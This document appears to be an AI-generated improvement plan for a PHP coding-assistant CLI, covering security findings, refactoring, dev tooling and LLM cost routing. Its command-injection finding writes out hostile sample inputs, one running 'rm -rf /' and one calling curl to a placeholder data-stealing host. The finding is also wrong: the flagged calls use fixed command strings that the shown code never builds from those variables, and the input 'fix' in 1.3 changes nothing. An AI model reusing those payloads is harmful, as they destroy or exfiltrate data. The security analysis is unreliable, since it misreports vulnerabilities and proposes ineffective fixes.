# Swarm AI Assistant - Comprehensive Improvement Plan V4

*Generated from analysis by Code Reviewer, DX Optimizer, and AI Engineer agents*

## Executive Summary

This document outlines critical improvements needed for the Swarm AI coding assistant based on comprehensive analysis of the codebase (11,545 lines of PHP 8.3+ code). The project demonstrates solid architecture and modern PHP practices but contains **critical security vulnerabilities** in the terminal UI system that must be addressed immediately.

---

## 1. Critical Security Vulnerabilities

### 1.1 Terminal UI Command Injection (CRITICAL)

**Location**: `src/CLI/Terminal/FullTerminalUI.php:1162-1163`  
**Severity**: CRITICAL - Remote Code Execution Risk

**Vulnerable Code**:
```php
// Lines 1162-1163: Direct exec() without sanitization
$this->terminalHeight = (int) exec('tput lines') ?: 24;
$this->terminalWidth = (int) exec('tput cols') ?: 80;

// Lines 280-283: Shell command execution
$this->originalTermState = trim(shell_exec('stty -g') ?? '');
system('stty -echo -icanon min 1 time 0');

// Lines 184-187: Terminal cleanup
system("stty {$this->originalTermState}");
```

**Additional Vulnerable Location**: `src/CLI/Terminal/Ansi.php:201`

**Exploitation Vector**:
```bash
# Environment variable injection
COLUMNS='80; rm -rf /' ./swarm-cli
LINES='24 && curl malicious-site.com/steal-data' ./swarm-cli
```

**Fix Implementation**:
```php
// Safe terminal size detection using PHP built-ins
protected function getTerminalSizeSafe(): array {
    // First try environment variables (already integers)
    $width = filter_var(getenv('COLUMNS'), FILTER_VALIDATE_INT) ?: null;
    $height = filter_var(getenv('LINES'), FILTER_VALIDATE_INT) ?: null;
    
    // Fallback to PHP stream detection
    if (!$width || !$height) {
        $stream = fopen('php://stdout', 'r');
        if ($stream && function_exists('stream_get_meta_data')) {
            $meta = stream_get_meta_data($stream);
            // Parse terminal info safely
        }
        fclose($stream);
    }
    
    return [
        $width ?: 80,
        $height ?: 24
    ];
}
```

### 1.2 Process Resource Leaks

**Location**: `src/CLI/Process/ProcessManager.php:36-52`  
**Severity**: HIGH - Denial of Service Risk

**Current Issue**: No timeout mechanism, no automatic cleanup
- Method `startProcess()` launches processes without timeouts
- No zombie process prevention
- Manual cleanup only via `cleanupCompletedProcesses()`

**Enhanced Fix with Signal Handling**:
```php
public function startProcess(string $input): string {
    $processId = uniqid('proc_');
    $processor = new ProcessSpawner($this->app, $this->log());
    
    $processor->launch($input);
    
    $this->activeProcesses[$processId] = [
        'processor' => $processor,
        'startTime' => microtime(true),
        'complete' => false,
        'timeout' => time() + 600, // 10 minute timeout
        'input' => $input,
        'updates' => [],
        'pid' => $processor->getPid(), // Track process ID
    ];
    
    // Register cleanup handler with signal support
    pcntl_signal(SIGCHLD, [$this, 'handleChildSignal']);
    register_tick_function([$this, 'cleanupTimedOutProcesses']);
    
    return $processId;
}

protected function handleChildSignal(int $signal): void {
    while (($pid = pcntl_waitpid(-1, $status, WNOHANG)) > 0) {
        $this->cleanupProcess($this->findProcessByPid($pid));
        $this->logInfo('Child process terminated', ['pid' => $pid, 'status' => $status]);
    }
}

public function cleanupTimedOutProcesses(): void {
    $now = time();
    foreach ($this->activeProcesses as $processId => $process) {
        if (!$process['complete'] && $now > $process['timeout']) {
            // Send SIGTERM first, then SIGKILL after 5 seconds
            posix_kill($process['pid'], SIGTERM);
            sleep(5);
            if (posix_kill($process['pid'], 0)) { // Check if still alive
                posix_kill($process['pid'], SIGKILL);
            }
            $this->terminate($processId);
            $this->logWarning('Process timed out', ['processId' => $processId]);
        }
    }
}
```

### 1.3 Input Validation Bypass

**Location**: `src/CLI/Terminal/FullTerminalUI.php:392-395`
**Severity**: MEDIUM

**Issue**: Accepts any printable ASCII without validation
```php
} elseif (mb_strlen($key) === 1 && ord($key) >= 32 && ord($key) <= 126) {
    $this->input .= $key;
    $this->stateChanged = true;
}
```

**Fix**: Add control character filtering
```php
} elseif (mb_strlen($key) === 1 && ord($key) >= 32 && ord($key) <= 126) {
    // Filter control characters and escape sequences
    $filtered = preg_replace('/[\x00-\x1F\x7F]/', '', $key);
    if ($filtered === $key) {
        $this->input .= $key;
        $this->stateChanged = true;
    }
}
```

---

## 2. Architecture & Code Quality Issues

### 2.1 Cyclomatic Complexity Reduction

**Issue**: `FullTerminalUI.php` has 1,384 lines with methods exceeding 100 lines

**Most Complex Methods**:
- `readKey()` (lines 1177-1269): 93 lines, complex input parsing
- `renderSidebar()` (lines 831-940): 110 lines, nested rendering logic  
- `renderHistoryEntry()` (lines 942-1016): 75 lines, multiple render paths

**Solution - Component Extraction**:
```php
// New structure splitting FullTerminalUI into focused components
src/CLI/Terminal/
├── FullTerminalUI.php (orchestrator, ~300 lines)
├── Components/
│   ├── HeaderComponent.php (50 lines)
│   ├── HistoryPane.php (200 lines)
│   ├── ActivityFeed.php (150 lines)
│   ├── InputHandler.php (250 lines)
│   └── StatusBar.php (75 lines)
├── Renderers/
│   ├── AnsiRenderer.php (100 lines)
│   └── LayoutEngine.php (150 lines)
└── Input/
    ├── KeyReader.php (150 lines)
    └── EscapeSequenceParser.php (100 lines)
```

**Implementation Example**:
```php
// Extract complex readKey() into dedicated parser
class EscapeSequenceParser {
    private const ESCAPE_SEQUENCES = [
        "\033[A" => 'UP',
        "\033[B" => 'DOWN',
        "\033[C" => 'RIGHT',
        "\033[D" => 'LEFT',
        "\033[H" => 'HOME',
        "\033[F" => 'END',
    ];
    
    public function parse(string $input): ?KeyEvent {
        if (isset(self::ESCAPE_SEQUENCES[$input])) {
            return new KeyEvent(self::ESCAPE_SEQUENCES[$input]);
        }
        
        // Handle alt combinations
        if (str_starts_with($input, "\033") && strlen($input) === 2) {
            return new KeyEvent('ALT+' . $input[1]);
        }
        
        return null;
    }
}
```

### 2.2 Missing Tool Execution Abstractions

**Current Issue**: Direct tool execution in `src/Core/ToolExecutor.php:154-219`
- No parallel execution capability
- No retry mechanisms
- No circuit breaker patterns

**Strategy Pattern Implementation**:
```php
interface ToolExecutionStrategy {
    public function canExecute(array $tools): bool;
    public function execute(array $tools): array;
    public function getName(): string;
}

class ParallelExecutionStrategy implements ToolExecutionStrategy {
    private ExecutorService $executor;
    
    public function __construct(int $maxThreads = 4) {
        $this->executor = new ExecutorService($maxThreads);
    }
    
    public function execute(array $tools): array {
        $promises = array_map(
            fn($tool) => $this->executor->submit(fn() => $tool->execute()),
            $tools
        );
        
        return Promise::all($promises)
            ->timeout(30) // 30 second timeout
            ->wait();
    }
    
    public function canExecute(array $tools): bool {
        // Check if all tools support parallel execution
        return array_reduce($tools, 
            fn($carry, $tool) => $carry && $tool->isThreadSafe(),
            true
        );
    }
}

class SequentialExecutionStrategy implements ToolExecutionStrategy {
    private CircuitBreaker $circuitBreaker;
    
    public function execute(array $tools): array {
        $results = [];
        foreach ($tools as $tool) {
            if (!$this->circuitBreaker->canExecute($tool->getName())) {
                throw new ServiceUnavailableException(
                    "Tool {$tool->getName()} circuit breaker is open"
                );
            }
            
            try {
                $results[] = $tool->execute();
                $this->circuitBreaker->recordSuccess($tool->getName());
            } catch (Exception $e) {
                $this->circuitBreaker->recordFailure($tool->getName());
                throw $e;
            }
        }
        return $results;
    }
}
```

### 2.3 Unified Error Handling

**Current Issues**: 
- Generic `Exception` in `ProcessManager.php:181`, `ProcessSpawner.php:76`
- `RuntimeException` in `CodingAgent.php:379,745`
- Inconsistent catch blocks throughout

**Error Boundary Implementation**:
```php
class ErrorBoundary {
    private CircuitBreaker $circuitBreaker;
    private Logger $logger;
    private MetricsCollector $metrics;
    
    public function wrap(callable $operation, string $context): mixed {
        $startTime = microtime(true);
        
        try {
            if (!$this->circuitBreaker->canExecute($context)) {
                throw new ServiceUnavailableException("Service $context is down");
            }
            
            $result = $operation();
            
            $this->circuitBreaker->recordSuccess($context);
            $this->metrics->record('operation.success', 1, ['context' => $context]);
            $this->metrics->record('operation.duration', 
                microtime(true) - $startTime, 
                ['context' => $context]
            );
            
            return $result;
            
        } catch (RateLimitException $e) {
            $this->logger->warning("Rate limit hit", [
                'context' => $context,
                'retry_after' => $e->getRetryAfter()
            ]);
            $this->circuitBreaker->recordFailure($context);
            $this->metrics->record('operation.rate_limited', 1, ['context' => $context]);
            throw new RetryableException($e->getMessage(), $e->getRetryAfter());
            
        } catch (NetworkException $e) {
            $this->logger->error("Network error", [
                'context' => $context,
                'error' => $e->getMessage()
            ]);
            $this->circuitBreaker->recordFailure($context);
            $this->metrics->record('operation.network_error', 1, ['context' => $context]);
            throw new RetryableException($e->getMessage(), 5); // Retry after 5 seconds
            
        } catch (Exception $e) {
            $this->logger->error("Operation failed", [
                'context' => $context,
                'error' => $e->getMessage(),
                'trace' => $e->getTraceAsString()
            ]);
            $this->circuitBreaker->recordFailure($context);
            $this->metrics->record('operation.error', 1, [
                'context' => $context,
                'error_type' => get_class($e)
            ]);
            throw $e;
        }
    }
}
```

---

## 3. Developer Experience Improvements

### 3.1 One-Command Setup

**Create**: `Makefile`
```makefile
.PHONY: setup dev test lint clean docker help

setup: ## Complete development setup
	@echo "🚀 Setting up Swarm development environment..."
	@composer install
	@cp -n .env.example .env || true
	@php setup.php validate
	@git config core.hooksPath .githooks
	@echo "✅ Setup complete! Run 'make dev' to start"

dev: ## Start development mode with hot reload
	@echo "🔥 Starting Swarm in development mode..."
	@SWARM_ENV=development php -d xdebug.mode=develop cli.php

test: ## Run test suite with coverage
	@./vendor/bin/pest --parallel --coverage

test-watch: ## Run tests in watch mode
	@./vendor/bin/pest --watch

lint: ## Run linting and static analysis
	@echo "🔍 Running code quality checks..."
	@./vendor/bin/pint
	@./vendor/bin/phpstan analyse
	@./vendor/bin/psalm

check: lint test ## Run all checks
	@echo "✅ All checks passed!"

docker: ## Run in Docker container
	@docker-compose up -d
	@docker-compose exec app make dev

clean: ## Clean generated files and caches
	@echo "🧹 Cleaning up..."
	@rm -rf vendor/ .phpunit.cache/ storage/logs/* storage/cache/*
	@composer clear-cache

help: ## Show this help
	@grep -E '^[a-zA-Z_-]+:.*?## .*$$' $(MAKEFILE_LIST) | awk 'BEGIN {FS = ":.*?## "}; {printf "\033[36m%-20s\033[0m %s\n", $$1, $$2}'

.DEFAULT_GOAL := help
```

### 3.2 Git Hooks with Parallel Checks

**Create**: `.githooks/pre-commit`
```bash
#!/bin/bash
set -e

echo "🔍 Running pre-commit checks..."

# Run checks in parallel for speed
(
    ./vendor/bin/pint --test && echo "✅ Code formatting" || (echo "❌ Code formatting failed" && exit 1)
) &
PID1=$!

(
    ./vendor/bin/phpstan analyse --no-progress && echo "✅ Static analysis" || (echo "❌ Static analysis failed" && exit 1)
) &
PID2=$!

(
    ./vendor/bin/pest --group=unit --stop-on-failure --compact && echo "✅ Unit tests" || (echo "❌ Unit tests failed" && exit 1)
) &
PID3=$!

# Wait for all background jobs
wait $PID1 $PID2 $PID3

echo "✅ All pre-commit checks passed!"
```

### 3.3 Enhanced IDE Configuration

**Create**: `.vscode/settings.json`
```json
{
  "php.version": "8.3",
  "php.validate.executablePath": "/usr/local/bin/php",
  "editor.formatOnSave": true,
  "editor.rulers": [120],
  "editor.defaultFormatter": "junstyle.php-cs-fixer",
  "[php]": {
    "editor.defaultFormatter": "junstyle.php-cs-fixer",
    "editor.tabSize": 4
  },
  "files.exclude": {
    "vendor": true,
    ".phpunit.cache": true,
    "storage/cache": true
  },
  "php-cs-fixer.executablePath": "${workspaceFolder}/vendor/bin/pint",
  "php-cs-fixer.onsave": true,
  "phpunit.phpunit": "${workspaceFolder}/vendor/bin/pest",
  "terminal.integrated.env.osx": {
    "XDEBUG_MODE": "debug,develop"
  },
  "search.exclude": {
    "**/vendor": true,
    "**/storage/logs": true,
    "**/storage/cache": true
  }
}
```

**Create**: `.vscode/launch.json` for debugging
```json
{
  "version": "0.2.0",
  "configurations": [
    {
      "name": "Debug Swarm CLI",
      "type": "php",
      "request": "launch",
      "program": "${workspaceFolder}/cli.php",
      "cwd": "${workspaceFolder}",
      "port": 9003,
      "runtimeArgs": ["-dxdebug.mode=debug", "-dxdebug.start_with_request=yes"],
      "env": {
        "XDEBUG_MODE": "debug",
        "SWARM_ENV": "development"
      }
    },
    {
      "name": "Debug Current Test",
      "type": "php",
      "request": "launch",
      "program": "${workspaceFolder}/vendor/bin/pest",
      "cwd": "${workspaceFolder}",
      "port": 9003,
      "args": ["${file}"],
      "env": {
        "XDEBUG_MODE": "debug"
      }
    }
  ]
}
```

### 3.4 Docker Development Environment

**Create**: `docker-compose.yml`
```yaml
version: '3.8'

services:
  app:
    build:
      context: .
      dockerfile: Dockerfile.dev
    volumes:
      - .:/app
      - composer-cache:/root/.composer/cache
    environment:
      - XDEBUG_MODE=debug,develop
      - PHP_IDE_CONFIG=serverName=swarm
    ports:
      - "9003:9003"
    tty: true
    stdin_open: true

volumes:
  composer-cache:
```

**Create**: `Dockerfile.dev`
```dockerfile
FROM php:8.3-cli

RUN apt-get update && apt-get install -y \
    git unzip libzip-dev \
    && docker-php-ext-install zip pcntl \
    && pecl install xdebug \
    && docker-php-ext-enable xdebug

COPY --from=composer:latest /usr/bin/composer /usr/bin/composer

WORKDIR /app

CMD ["tail", "-f", "/dev/null"]
```

---

## 4. AI/LLM Optimization

### 4.1 Enhanced Prompt Engineering

**Current Issue**: No few-shot examples in `src/Prompts/PromptTemplates.php:44-52`

**Add Few-Shot Examples**:
```php
public static function classificationSystemWithExamples(): string {
    return "You are an AI coding assistant that classifies user requests.

Examples:
Q: 'Show me how to create a singleton pattern'
A: {\"request_type\": \"demonstration\", \"requires_tools\": false, \"confidence\": 0.95}

Q: 'Create a file called config.php with database settings'
A: {\"request_type\": \"implementation\", \"requires_tools\": true, \"confidence\": 0.90}

Q: 'What is dependency injection?'
A: {\"request_type\": \"explanation\", \"requires_tools\": false, \"confidence\": 0.95}

Q: 'Refactor this function to use early returns'
A: {\"request_type\": \"implementation\", \"requires_tools\": true, \"confidence\": 0.85}

Q: 'Find all places where getUserData is called'
A: {\"request_type\": \"implementation\", \"requires_tools\": true, \"confidence\": 0.90}

Now classify the following request:";
}
```

### 4.2 Dynamic Temperature Scaling

**Current Issue**: Fixed temperature (0.3) in `src/Agent/CodingAgent.php:30-31,319,473`

**Implementation**:
```php
protected function getTemperatureForTask(string $taskType, int $retryCount = 0): float {
    $baseTemp = match($taskType) {
        'classification', 'extraction' => 0.1,  // Deterministic
        'planning', 'execution' => 0.3,         // Structured
        'explanation', 'demonstration' => 0.5,   // Balanced
        'conversation' => 0.7,                   // Creative
        'debug', 'error_recovery' => 0.4,       // Slightly varied for problem solving
        default => 0.5
    };
    
    // Increase temperature slightly on retries to get different results
    $retryAdjustment = min($retryCount * 0.1, 0.3);
    
    return min($baseTemp + $retryAdjustment, 1.0);
}
```

### 4.3 Context Management Optimization

**Current Issue**: Simple sliding window in `src/Agent/CodingAgent.php:1075-1124`

**Intelligent Context Pruning**:
```php
protected function optimizeContext(array $history): array {
    $scored = [];
    $now = time();
    
    foreach ($history as $index => $message) {
        $score = 0;
        
        // Recency score (exponential decay)
        $age = $now - ($message['timestamp'] ?? $now);
        $score += exp(-$age / 3600) * 10; // Decay over hours
        
        // Role importance
        $score += match($message['role']) {
            'system' => 20,
            'user' => 8,
            'assistant' => 5,
            default => 1
        };
        
        // Content importance indicators
        if (str_contains($message['content'], 'error')) $score += 15;
        if (str_contains($message['content'], 'file:')) $score += 10;
        if (str_contains($message['content'], 'function')) $score += 8;
        if (preg_match('/\.(php|js|py|java)/', $message['content'])) $score += 7;
        
        // Short messages are often important commands
        if (strlen($message['content']) < 200) $score += 5;
        
        // Tool responses are valuable
        if (isset($message['tool_call_id'])) $score += 12;
        
        $scored[] = ['message' => $message, 'score' => $score];
    }
    
    // Sort by score descending
    usort($scored, fn($a, $b) => $b['score'] <=> $a['score']);
    
    // Take top messages within token budget
    $contextSize = 0;
    $optimized = [];
    $maxTokens = 3000; // Reserve for context
    
    foreach ($scored as $item) {
        $tokens = $this->estimateTokens($item['message']['content']);
        if ($contextSize + $tokens < $maxTokens) {
            $optimized[] = $item['message'];
            $contextSize += $tokens;
        }
    }
    
    // Restore chronological order
    usort($optimized, fn($a, $b) => 
        ($a['timestamp'] ?? 0) <=> ($b['timestamp'] ?? 0)
    );
    
    return $optimized;
}
```

### 4.4 Multi-Model Router

**New Component**: `src/AI/ModelRouter.php`
```php
class ModelRouter {
    private array $models = [
        'nano' => 'gpt-4o-mini',        // Fast, cheap for simple tasks
        'standard' => 'gpt-4o',          // Balanced performance
        'turbo' => 'gpt-4-turbo',        // Complex reasoning
        'opus' => 'claude-3-opus',       // Best for code generation
        'gemini' => 'gemini-1.5-pro'     // Long context (1M tokens)
    ];
    
    private array $costs = [ // Per 1K tokens
        'gpt-4o-mini' => ['input' => 0.00015, 'output' => 0.0006],
        'gpt-4o' => ['input' => 0.005, 'output' => 0.015],
        'gpt-4-turbo' => ['input' => 0.01, 'output' => 0.03],
        'claude-3-opus' => ['input' => 0.015, 'output' => 0.075],
        'gemini-1.5-pro' => ['input' => 0.00125, 'output' => 0.005]
    ];
    
    public function selectModel(
        string $taskType, 
        int $complexity, 
        int $contextLength,
        ?float $maxCost = null
    ): string {
        // Ultra-long context tasks
        if ($contextLength > 100000) {
            return $this->models['gemini'];
        }
        
        // Long context tasks  
        if ($contextLength > 50000) {
            return $this->models['turbo'];
        }
        
        // Code generation/analysis preference
        if (in_array($taskType, ['implementation', 'refactor', 'debug', 'review'])) {
            // Complexity-based selection for code tasks
            if ($complexity > 8) {
                return $this->models['opus'];
            }
            if ($complexity > 5) {
                return $this->models['turbo'];
            }
            return $this->models['standard'];
        }
        
        // Simple classification/extraction
        if (in_array($taskType, ['classification', 'extraction'])) {
            return $this->models['nano'];
        }
        
        // Cost-conscious selection
        if ($maxCost !== null) {
            return $this->selectByCost($taskType, $contextLength, $maxCost);
        }
        
        // Default based on complexity
        return match(true) {
            $complexity <= 3 => $this->models['nano'],
            $complexity <= 6 => $this->models['standard'],
            default => $this->models['turbo']
        };
    }
    
    public function estimateCost(string $model, int $inputTokens, int $outputTokens): float {
        $modelKey = array_search($model, $this->models);
        if (!$modelKey || !isset($this->costs[$model])) {
            throw new InvalidArgumentException("Unknown model: $model");
        }
        
        $inputCost = ($inputTokens / 1000) * $this->costs[$model]['input'];
        $outputCost = ($outputTokens / 1000) * $this->costs[$model]['output'];
        
        return round($inputCost + $outputCost, 4);
    }
}
```

### 4.5 Response Caching Layer

```php
class ResponseCache {
    private Redis $redis;
    private int $ttl = 300; // 5 minutes default
    private MetricsCollector $metrics;
    
    public function get(string $prompt, string $model, array $params = []): ?array {
        $key = $this->generateKey($prompt, $model, $params);
        
        $cached = $this->redis->get($key);
        if ($cached) {
            $this->metrics->record('cache.hit', 1, ['model' => $model]);
            $this->logger->debug('Cache hit', ['key' => $key]);
            return json_decode($cached, true);
        }
        
        $this->metrics->record('cache.miss', 1, ['model' => $model]);
        return null;
    }
    
    public function set(string $prompt, string $model, array $response, array $params = []): void {
        $key = $this->generateKey($prompt, $model, $params);
        
        // Don't cache errors or low-confidence responses
        if (isset($response['error']) || 
            (isset($response['confidence']) && $response['confidence'] < 0.7)) {
            return;
        }
        
        $this->redis->setex($key, $this->ttl, json_encode($response));
        $this->metrics->record('cache.set', 1, ['model' => $model]);
    }
    
    private function generateKey(string $prompt, string $model, array $params): string {
        // Include temperature and other params in cache key
        $keyData = [
            'prompt' => $prompt,
            'model' => $model,
            'temperature' => $params['temperature'] ?? 0.5,
            'max_tokens' => $params['max_tokens'] ?? null
        ];
        
        return 'swarm:cache:' . md5(json_encode($keyData));
    }
    
    public function invalidate(string $pattern = '*'): int {
        $keys = $this->redis->keys("swarm:cache:$pattern");
        return $this->redis->del($keys);
    }
}
```

### 4.6 Token Budget Management

```php
class TokenBudgetManager {
    private int $dailyLimit;
    private int $hourlyLimit;
    private array $usage = [];
    private string $storageFile;
    
    public function __construct(
        int $dailyLimit = 100000,
        int $hourlyLimit = 10000
    ) {
        $this->dailyLimit = $dailyLimit;
        $this->hourlyLimit = $hourlyLimit;
        $this->storageFile = 'storage/token_usage.json';
        $this->loadUsage();
    }
    
    public function canAfford(int $estimatedTokens, string $model): bool {
        $this->resetIfNeeded();
        
        $hourlyUsed = $this->getHourlyUsage();
        $dailyUsed = $this->getDailyUsage();
        
        // Check both limits
        if ($hourlyUsed + $estimatedTokens > $this->hourlyLimit) {
            $this->logger->warning('Approaching hourly token limit', [
                'used' => $hourlyUsed,
                'limit' => $this->hourlyLimit,
                'model' => $model
            ]);
            return false;
        }
        
        if ($dailyUsed + $estimatedTokens > $this->dailyLimit) {
            $this->logger->warning('Approaching daily token limit', [
                'used' => $dailyUsed,
                'limit' => $this->dailyLimit,
                'model' => $model
            ]);
            return false;
        }
        
        return true;
    }
    
    public function track(int $tokens, float $cost, string $model): void {
        $entry = [
            'timestamp' => time(),
            'tokens' => $tokens,
            'cost' => $cost,
            'model' => $model
        ];
        
        $this->usage[] = $entry;
        $this->saveUsage();
        
        $dailyUsed = $this->getDailyUsage();
        $dailyCost = $this->getDailyCost();
        
        $this->logger->info('Token usage tracked', [
            'tokens' => $tokens,
            'cost' => $cost,
            'model' => $model,
            'daily_used' => $dailyUsed,
            'daily_limit' => $this->dailyLimit,
            'daily_percentage' => round(($dailyUsed / $this->dailyLimit) * 100, 2),
            'daily_cost' => $dailyCost
        ]);
        
        // Alert at 80% usage
        if ($dailyUsed > $this->dailyLimit * 0.8) {
            $this->sendAlert('Approaching daily token limit', [
                'remaining' => $this->dailyLimit - $dailyUsed,
                'cost_so_far' => $dailyCost
            ]);
        }
    }
    
    private function getHourlyUsage(): int {
        $hourAgo = time() - 3600;
        return array_reduce($this->usage, 
            fn($sum, $entry) => $entry['timestamp'] > $hourAgo ? $sum + $entry['tokens'] : $sum,
            0
        );
    }
    
    private function getDailyUsage(): int {
        $dayAgo = time() - 86400;
        return array_reduce($this->usage,
            fn($sum, $entry) => $entry['timestamp'] > $dayAgo ? $sum + $entry['tokens'] : $sum,
            0
        );
    }
}
```

---

## 5. Terminal UI Enhancements

### 5.1 Debug Mode Implementation

```php
class TerminalDebugMode {
    private bool $enabled;
    private array $metrics = [];
    private float $lastRenderTime = 0;
    
    public function __construct() {
        $this->enabled = getenv('SWARM_UI_DEBUG') === 'true';
        
        if ($this->enabled) {
            $this->initDebugLog();
        }
    }
    
    public function startRender(): void {
        if (!$this->enabled) return;
        $this->renderStartTime = microtime(true);
    }
    
    public function endRender(): void {
        if (!$this->enabled) return;
        
        $this->lastRenderTime = (microtime(true) - $this->renderStartTime) * 1000;
        $this->metrics['renders'][] = $this->lastRenderTime;
        
        // Keep only last 100 renders for FPS calculation
        if (count($this->metrics['renders']) > 100) {
            array_shift($this->metrics['renders']);
        }
    }
    
    public function renderDebugPanel(): string {
        if (!$this->enabled) return '';
        
        $stats = [
            'FPS' => $this->calculateFPS(),
            'Render' => sprintf('%.2fms', $this->lastRenderTime),
            'Memory' => $this->formatBytes(memory_get_usage(true)),
            'Peak' => $this->formatBytes(memory_get_peak_usage(true)),
            'Handlers' => count($this->getEventHandlers()),
            'Processes' => $this->getActiveProcessCount()
        ];
        
        // Render as overlay in top-right corner
        $panel = "┌─ Debug ─────────────┐\n";
        foreach ($stats as $label => $value) {
            $panel .= sprintf("│ %-8s: %10s │\n", $label, $value);
        }
        $panel .= "└─────────────────────┘";
        
        return $this->positionOverlay($panel, 'top-right');
    }
    
    private function calculateFPS(): float {
        if (empty($this->metrics['renders'])) return 0;
        
        $avgRenderTime = array_sum($this->metrics['renders']) / count($this->metrics['renders']);
        return $avgRenderTime > 0 ? round(1000 / $avgRenderTime, 1) : 0;
    }
}
```

### 5.2 Responsive Layout System

```php
class ResponsiveLayout {
    private array $breakpoints = [
        'xs' => 40,   // Ultra narrow
        'sm' => 80,   // Small terminal
        'md' => 120,  // Medium terminal
        'lg' => 160,  // Large terminal
        'xl' => 200   // Extra large
    ];
    
    public function getLayout(int $width, int $height): array {
        $size = $this->getSize($width);
        
        return match($size) {
            'xs' => $this->getMinimalLayout($width, $height),
            'sm' => $this->getCompactLayout($width, $height),
            'md' => $this->getStandardLayout($width, $height),
            'lg', 'xl' => $this->getFullLayout($width, $height),
            default => $this->getStandardLayout($width, $height)
        };
    }
    
    private function getMinimalLayout(int $width, int $height): array {
        // Single column, no sidebar
        return [
            'header' => ['height' => 2, 'width' => $width],
            'main' => ['height' => $height - 4, 'width' => $width],
            'input' => ['height' => 2, 'width' => $width],
            'sidebar' => null,
            'footer' => null
        ];
    }
    
    private function getFullLayout(int $width, int $height): array {
        $sidebarWidth = (int)($width * 0.3); // 30% for sidebar
        
        return [
            'header' => ['height' => 3, 'width' => $width],
            'sidebar' => [
                'height' => $height - 6,
                'width' => $sidebarWidth,
                'x' => 0,
                'y' => 3
            ],
            'main' => [
                'height' => $height - 6,
                'width' => $width - $sidebarWidth - 1,
                'x' => $sidebarWidth + 1,
                'y' => 3
            ],
            'input' => ['height' => 2, 'width' => $width, 'y' => $height - 3],
            'footer' => ['height' => 1, 'width' => $width, 'y' => $height - 1]
        ];
    }
}
```

### 5.3 Advanced Terminal Capabilities

```php
class TerminalCapabilities {
    private array $capabilities = [];
    private static ?self $instance = null;
    
    public static function detect(): self {
        if (self::$instance === null) {
            self::$instance = new self();
        }
        return self::$instance;
    }
    
    private function __construct() {
        $this->detectAll();
    }
    
    private function detectAll(): void {
        // Color support detection
        $this->capabilities['colors'] = $this->detectColorSupport();
        
        // Unicode support
        $this->capabilities['unicode'] = $this->detectUnicodeSupport();
        
        // Terminal type
        $this->capabilities['type'] = getenv('TERM') ?: 'unknown';
        
        // Terminal emulator detection
        $this->capabilities['emulator'] = $this->detectEmulator();
        
        // Size
        $this->capabilities['size'] = $this->getTerminalSize();
        
        // Mouse support
        $this->capabilities['mouse'] = $this->detectMouseSupport();
        
        // Sixel graphics support
        $this->capabilities['sixel'] = $this->detectSixelSupport();
        
        // Kitty graphics protocol
        $this->capabilities['kitty_graphics'] = $this->detectKittyGraphics();
    }
    
    private function detectColorSupport(): int {
        $term = getenv('TERM') ?: '';
        $colorterm = getenv('COLORTERM') ?: '';
        
        // True color (24-bit)
        if ($colorterm === 'truecolor' || $colorterm === '24bit') {
            return 16777216;
        }
        
        // 256 colors
        if (str_contains($term, '256color')) {
            return 256;
        }
        
        // 16 colors
        if (str_contains($term, 'color')) {
            return 16;
        }
        
        // Monochrome
        return 0;
    }
    
    private function detectEmulator(): string {
        // Check various environment variables
        $checks = [
            'TERM_PROGRAM' => getenv('TERM_PROGRAM'),
            'TERMINAL_EMULATOR' => getenv('TERMINAL_EMULATOR'),
            'KONSOLE_VERSION' => getenv('KONSOLE_VERSION') ? 'konsole' : null,
            'ITERM_SESSION_ID' => getenv('ITERM_SESSION_ID') ? 'iterm2' : null,
            'WT_SESSION' => getenv('WT_SESSION') ? 'windows-terminal' : null,
            'VSCODE_TERM' => getenv('TERM_PROGRAM') === 'vscode' ? 'vscode' : null,
        ];
        
        foreach ($checks as $check) {
            if ($check) return strtolower($check);
        }
        
        return 'unknown';
    }
    
    private function detectMouseSupport(): bool {
        $emulator = $this->capabilities['emulator'] ?? 'unknown';
        $supportedEmulators = ['iterm2', 'windows-terminal', 'gnome-terminal', 'konsole', 'xterm'];
        
        return in_array($emulator, $supportedEmulators);
    }
    
    public function canUse(string $feature): bool {
        return match($feature) {
            'colors' => ($this->capabilities['colors'] ?? 0) > 0,
            'truecolor' => ($this->capabilities['colors'] ?? 0) >= 16777216,
            '256colors' => ($this->capabilities['colors'] ?? 0) >= 256,
            'unicode' => $this->capabilities['unicode'] ?? false,
            'mouse' => $this->capabilities['mouse'] ?? false,
            'sixel' => $this->capabilities['sixel'] ?? false,
            'kitty_graphics' => $this->capabilities['kitty_graphics'] ?? false,
            default => false
        };
    }
    
    public function getBestAvailable(string ...$features): ?string {
        foreach ($features as $feature) {
            if ($this->canUse($feature)) {
                return $feature;
            }
        }
        return null;
    }
}
```

---

## 6. Performance Monitoring

### 6.1 Metrics Collection System

```php
class MetricsCollector {
    private array $metrics = [];
    private array $timers = [];
    private ExportInterface $exporter;
    
    public function __construct(ExportInterface $exporter = null) {
        $this->exporter = $exporter ?? new PrometheusExporter();
    }
    
    public function startTimer(string $name): void {
        $this->timers[$name] = microtime(true);
    }
    
    public function endTimer(string $name, array $tags = []): float {
        if (!isset($this->timers[$name])) {
            throw new InvalidArgumentException("Timer '$name' not started");
        }
        
        $duration = microtime(true) - $this->timers[$name];
        unset($this->timers[$name]);
        
        $this->record("{$name}.duration", $duration, $tags);
        return $duration;
    }
    
    public function increment(string $metric, array $tags = []): void {
        $this->record($metric, 1, $tags);
    }
    
    public function record(string $metric, float $value, array $tags = []): void {
        $this->metrics[] = [
            'metric' => $metric,
            'value' => $value,
            'tags' => $tags,
            'timestamp' => microtime(true)
        ];
        
        // Auto-flush at threshold
        if (count($this->metrics) >= 100) {
            $this->flush();
        }
    }
    
    public function gauge(string $metric, float $value, array $tags = []): void {
        // Gauges replace previous values
        $key = $this->getMetricKey($metric, $tags);
        $this->metrics[$key] = [
            'metric' => $metric,
            'value' => $value,
            'tags' => $tags,
            'timestamp' => microtime(true),
            'type' => 'gauge'
        ];
    }
    
    public function flush(): void {
        if (empty($this->metrics)) return;
        
        try {
            $this->exporter->export($this->metrics);
            $this->metrics = [];
        } catch (Exception $e) {
            $this->logger->error('Failed to export metrics', [
                'error' => $e->getMessage(),
                'metrics_count' => count($this->metrics)
            ]);
        }
    }
    
    public function histogram(string $metric, float $value, array $buckets = null): void {
        $buckets = $buckets ?? [0.01, 0.025, 0.05, 0.1, 0.25, 0.5, 1, 2.5, 5, 10];
        
        foreach ($buckets as $bucket) {
            if ($value <= $bucket) {
                $this->increment("{$metric}.bucket", ['le' => (string)$bucket]);
            }
        }
        
        $this->record("{$metric}.sum", $value);
        $this->increment("{$metric}.count");
    }
}
```

